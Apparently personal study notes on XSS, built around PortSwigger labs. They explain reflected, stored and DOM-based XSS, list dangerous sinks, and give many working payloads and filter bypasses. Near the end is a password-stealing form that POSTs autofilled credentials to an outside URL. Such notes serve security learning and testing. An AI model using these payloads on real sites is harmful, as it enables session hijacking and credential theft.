- attackers injecting malicious Javascript into a website, which will then be executed by a victim when they access and interact with the page
- you can use event handlers as an alternative to `<script></script>` tags to execute XSS
# XSS POC
- `alert()` function can be used to check if a web application is vulnerable to XSS
	- `alert()` creates a notification in the website 
		- `<script>alert("XSS");</script>`
	- use `print()` as the POC payload when using the Chrome browser 
		- `<script>print("XSS");</script>`
- more ways to test : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
# Types of XSS 
- **reflected XSS** : input is reflected back in the response where it is identified as a script blog and then executed
	- malicious javascript comes from the current HTTP request
- **stored XSS** : input is not only reflected and executed, but is also stored in the database - persistent
	- affects everyone that accesses the page, not just one (comment, where everyone who accesses the comment section is affected)
- **DOM-based XSS** : vulnerability is in the client-side code rather than server-side code
	- occurs within the Document Object Model of the webpage
	- eg. injecting it into URI fragments (`<URL>/#exploit-code-or-poc` - `#` is purely client-side code where you can jump to headings, therefore can inject DOM-based XSS)
# Reflected XSS 
- application receives malicious javascript in the request and includes that data within the immediate response
	`https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>`
- this causes the following to be returned in the response:
	`<p>Status: <script>/* Bad stuff here... */</script></p>`
Lab: [Reflected XSS into HTML context with nothing encoded](../../../../writeups/portswigger/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded.md)
- REFLECTED XSS IS NOT STORED IN THE DATABASE
	- therefore you need to send then link with the malicious javascript to a victim to click on it (phishing!)
		- using `document.cookie` to get the session cookie of the victim
		- eg. if a victim clicks on a link where the malicious script is `alert(document.cookie)` it can expose the sensitive information of the attacker 
		- further implementation by the attacker will allow the information from `alert(document.cookie)` to be sent to the attacker to enumerate information
			![](../../images/reflected_xss.png)
		- as reflected XSS requires an external mechanism, it is less severe than stored XSS
[Reflected XSS into HTML context with most tags and attributes blocked](../../../../writeups/portswigger/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked.md)
[Reflected XSS into HTML context with all tags blocked except custom ones](../../../../writeups/portswigger/Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones.md)
[Reflected XSS with some SVG markup allowed](../../../../writeups/portswigger/Reflected%20XSS%20with%20some%20SVG%20markup%20allowed.md)
## Reflected XSS In HTML Tag Attributes
- sometimes can terminate the attribute value, close the tag and introduce a new tag
- more commonly, angle brackets are encoded, meaning that it will be reflected back in encoding, preventing the closing of the tag and hence execution of the javascript
	- if can terminate the attribute value, can introduce a new attribute that creates a script, using event handlers
		`" autofocus onfocus=alert(document.domain) x="`
		- `autofocus` triggers focus without user interaction, which will fire the `onfocus` event automatically
		- `x` is used to close to repair the markup 
			`a src=" " autofocus onfocus=alert(document.domain) x=" "`
Lab: [Reflected XSS into attribute with angle brackets HTML-encoded](../../../../writeups/portswigger/Reflected%20XSS%20into%20attribute%20with%20angle%20brackets%20HTML-encoded.md)
- injections are possible with tags that don't usually fire events automatically, like an canonical tag
	- canonical tag tells the search engine which version of the page is the master copy when there are multiple versions available
		- found in the `head` of the webpage
		- `<link rel="canonical" href="https://www.example.com/original-page" />`
	- can use `accesskey` attribute to exploit
		- can assign a letter on keyboard for a shortcut
			`<a href="#home" accesskey="h">Home</a>
Lab: [Reflected XSS in canonical link tag](../../../../writeups/portswigger/Reflected%20XSS%20in%20canonical%20link%20tag.md)
## XXS Into Javascript
### Terminating Existing Script
- eg. script:
	```javascript
		<script>
		...
		var input = 'controllable data here';
		...
		</script>
		```
- can terminate the script and add in your own script
	```javascript
	</script><img src = 1 onerror=alert(1)>
	```
- NOTE: whatever is within the `script` tags cannot be HTML elements, must be javascript
### Breaking Out Of Javascript Strings
- if XSS context is inside quoted string literal, can break out of the string and execute JS directly
	```javascript
	'-alert(document.domain)-'
	';alert(document.domain)//
	```
## Escaping The Escape Characters
- some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash.
	- backslash tells the JS parser that the character is to be interpreted literally, not as a special character as a string terminator. 
	- applications often make the mistake of not escaping the backslash character (\) itself
		- hence an attacker can use their own \ to neutralize the \ by the application 
- `';alert(document.domain)//` is converted to:
		``\';alert(document.domain)//`
- can use the alternative payload:
	`\';alert(document.domain)//`
which gets converted to:
	`\\';alert(document.domain)//`
- this means that the second \ is interpreted literally and not as a special character (escape character)
- hence, the `'` can be interpreted as a string terminator
## Tips
- HTML encoding prevents user input from being interpreted as HTML code
	- this means that if angle brackets (`<>`) are HTML encoded, user input will not be interpreted as code and will be returned as plaintext
- URL encoding is for query parameters, so that it does not break the URL and return a invalid URL and also prevent additional payloads from being sent (& for eg.)
	- URL can only be sent over in ASCII format
- Use throw statement with exception handler to bypass WAF (call without using parantheses)
	`onerror=alert;throw 1`
	- many other ways to do it, this is just 1
# Stored XSS
1. attacker sends malicious javascript to the website, which is then stored in the database
2. when the victim then accesses the website (from no phishing link) the script stored is then executed
3. the script is executed every time the page is accessed, making it very dangerous
- examples would be the comment function is a blog post
	- malicious code is executed when the others view the blog post/comment, allowing attacker to perform various actions
		- eg. pop-up displaying the session details (`alert(document.cookie)`) can be sent to the attacker at a larger magnitude
- entry point : where the malicious script is injected
- exit point : all endpoints where the script is executed
Labs: 
[Stored XSS into HTML context with nothing encoded](../../../../writeups/portswigger/Stored%20XSS%20into%20HTML%20context%20with%20nothing%20encoded.md)
## Stored XSS In HTML Tags
- can XSS into a HTML tag without the need for closing the attribute by calling on the js pseudo protocol
- if a functionality has a website field, it will probably use the `<a>` tag to hyperlink, hence inject into the website field
`<a href="javascript:alert(document.domain)">`
Lab: [Stored XSS into anchor href attribute with double quotes HTML-encoded](../../../../writeups/portswigger/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded.md)

## Making Use Of HTML-Encoding
1. input parsed into search functionality
2. browser parses the input to the server
3. server has a function to check for XSS
	- if there is HTML encoding and the function does not account for this (flaw) then it will accept the input and return the response
	- the browser then decodes the HTML encoding and executes the XSS
- if the XSS context is as follows:
	`<a href="#" onclick="... var input='controllable data here'; ...">`
- if the application blocks or escapes single quotes characters, can use the following payload to break out:
	`&apos;-alert(document.domain)-&apos;`
		`&apos` represents single quote
		- browser then decodes the string terminators and executes the JS 
## XSS In JavaScript Template Literals 
- template literal: string literals that allow embedded JS expressions
	- embedded expressions are evaluated and are normally concatenated into the surrounding text 
	- template literals are encapsulated in backticks 
	- embedded expressions are identified using `${..}`
- if the XSS context is as such:'
	`document.getElementById('message').innerText = ``Welcome, ${user.displayName}.``;`
- there is no need to terminate the literal
	- use `${..}` to embed
		payload: `${alert(document.domain)}`

# DOM-Based XSS
- script is executed in the client side - doesn't hit the server
	- no new webpages are generated when executing the script, as the web page supports dynamic code
- source : anywhere that a user-controllable input originates or enters an application
	- points where malicious javascript can be introduced
- a common source is usually the URL
	- typically accessed with the `windows.location` object
- sinks : anywhere that a malicious input can be executed or "sunk" into the page's code
- common sinks:
```javascript
// innerHTML
var userInput = "<script>alert('XSS');</script>";
document.getElementById("targetElement").innerHTML = userInput;
// document.write()
var userInput = "<script>alert('XSS');</script>";
document.write(userInput);
// eval()
var userInput = "alert('XSS')";
eval(userInput);
// setAttribute()
var userInput = "javascript:alert('XSS')";
document.getElementById("targetElement").setAttribute("href", userInput);
```
- need to use a browser with developer tools 
## Testing For HTML Sinks 
- place alphanumeric string into a source such as `location.search`
	- `location.search` can be both a source and a sink
	- represents the query string portion of the URL (`?` followed by query parameters)
```javascript
// Get the query parameter from location.search
var queryString = location.search.substring(1); // Remove the "?" from the beginning
var params = new URLSearchParams(queryString);
var searchQuery = params.get("query");

// Display search results on the page
document.getElementById("searchResults").innerText = "Search results for: " + searchQuery;

```

- if an attacker crafts a malicious URL like:
```javascript
https://example.com/search?query=<script>alert('XSS')</script>
```
- this will output a pop-up "XSS" on the screen 
### Tips 
- if the string appears within double quotes then inject double quotes to break out of the attribute
- use find function to search for scripts 
## Testing JavaScript Execution Sinks 
- with these sinks, the input doesn't necessarily appear anywhere within the DOM
- need to use javascript debugger i the developer tools 
	1. use control+shift+F to search for all javascript code for the source
	2. use javascript debugger to add a breakpoint and follow how the source's value is used
		- source might get assigned to other variables, so use the search function to track the variables and see if they are passed through a sink
	3. when found the sink where the original data from the source is parsed through, use the debugger to inspect the value
	4. refine input to see if can deliver an XSS attack
Labs: 
[DOM XSS in document.write sink using source location.search](../../../../writeups/portswigger/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search.md)
[DOM XSS in document.write sink using source location.search inside a select element](../../../../writeups/portswigger/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element.md)
- `innerHTML` sink does not accept script elements, so must use event handler or error handling eg.
	- `<img src=1 onerror=alert(document.domain)>`
	- `innerHTML` allows you to manipulate items within tags:
		- `document.getElementById(<id>).innerHTML='<img src = 1 onerror=alert(document.domain)'`
			- `getElementById(<id>)`: this gets the tag by Id
			- `innerHTML` : whatever that is within the tag that is retrieved
			- `onerror` : whatever is the error when the image is failed to retrieved
Lab: [DOM XSS in innerHTML sink using source location.search](../../../../writeups/portswigger/DOM%20XSS%20in%20innerHTML%20sink%20using%20source%20location.search.md)
## DOM XSS In jQuery
- javascript library
	- look for sinks that can alter DOM elements 
		- jQuery `attr()` can change the attributes of DOM elements
```javascript 
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
- in the above code:
	1. `$(function() { ... });`: This is a shorthand for `$(document).ready(function() { ... });`. It waits for the DOM to be fully loaded before executing the enclosed function. It ensures that the code inside the function doesn't run until the HTML document is ready.
	2. `$('#backLink')`: This selects an element with the ID `backLink`. It is likely a link (`<a>`) element.
		- `#` is used to reference id
	3. `.attr("href", ... )`: This sets the `href` attribute of the selected element.
	4. `(new URLSearchParams(window.location.search)).get('returnUrl')`: This constructs a new `URLSearchParams` object using the query string portion (`window.location.search`) of the current URL. It then retrieves the value of the query parameter named `returnUrl`.
- the value of `returnURL` can be manipulated as such:
	`?returnURL=javascript:alert(document.domain)`
		- cannot use script tags because the sink is `attr()` where `href` is being used to change the attribute of the element with the id `#backLink
		- `javascript:alert(1)` does not work for `<img src=>` 
Lab: [DOM XSS in jQuery anchor href attribute sink using location.search source](../../../../writeups/portswigger/DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source.md)
```javascript
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
1. attaches a `hashchange` event (prebuilt event) to the `window` object where there is a event handler function 
	-  brings the window into view when there is a change in hash
- an attacker can exploit this with the following code:

	`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
	- create a phishing link with the above iframe as the element in the body
	- this appends the payload on load of the website with just `#`, resulting in a hash change event
		- this causes the function to kick in, where the `<img src=1 onerror=alert(1)>` is assigned to the element variable
			- `.scrollIntoView` will hence throw an error as that is not a legitimate hash as it is unable to render `1`
				- this will result in `onerror` being executed, where there will be an alert
Lab: [DOM XSS in jQuery selector sink using a hashchange event](../../../../writeups/portswigger/DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event.md)
## DOM XSS In AngularJS
- using AngularJS, there is no need to use angle brackets or script tags or events
	- `{{}}` can be used to execute javascript
- if a website has the `ng-app` attribute, there is AngularJS processing
	- can execute eg. `{{constructor.constructor('alert(1)')()}}` into search box if `ng-app` present in the HTML code
- eg. payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
Lab : [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](../../../../writeups/portswigger/DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded.md)
## Reflected DOM XSS 
- the server processes data from the request and echoes the data into the response
	- the reflected data might be placed in a javascript string literal or data item within the DOM (eg. form field)
	- script on the page processes the reflected data in an unsafe way, consequently writing the data to a dangerous sink
`eval('var data = "reflected string"');`
Lab: [Reflected DOM XSS](../../../../writeups/portswigger/Reflected%20DOM%20XSS.md)
## Stored DOM XSS
- website receives data from one request, stores it and then includes the data in a later response
	- a script within the later response contains a sink which then processes the data in an unsafe way
`element.innerHTML = comment.author`
Lab: [Stored DOM XSS](../../../../writeups/portswigger/Stored%20DOM%20XSS.md)
## Potential Sinks
### Main Sinks
```javascript
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
### jQuery Sinks
```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```
# Exploiting XSS
## Exploiting XSS To Steal Cookies
Lab: [Exploiting cross-site scripting to steal cookies](../../../../writeups/portswigger/Exploiting%20cross-site%20scripting%20to%20steal%20cookies.md)
## Exploiting XSS To Steal Passwords
- to exploit the `autofill` function of browsers
```html 
<body>
  <script>
    function stealsCreds(u, p) {
      fetch("https://", {
        method: "POST",
        mode: "no-cors",
        body: u+":"+p,
      });
    }
  </script>
  <form>
    username:<input type="text" id="username101" name="username" />
    password:<input
      name="password"
      type="password"
      id="password101"
      onchange="if(this.value.length){stealsCreds((document.getElementById('username101').value),(document.getElementById('password101').value));}"
    />
  </form>
</body>
```
Lab: [Exploiting cross-site scripting to capture passwords](../../../../writeups/portswigger/Exploiting%20cross-site%20scripting%20to%20capture%20passwords.md)
## Exploiting XSS To Perform CSRF 
Lab: [Exploiting XSS to perform CSRF](../../../../writeups/portswigger/Exploiting%20XSS%20to%20perform%20CSRF.md)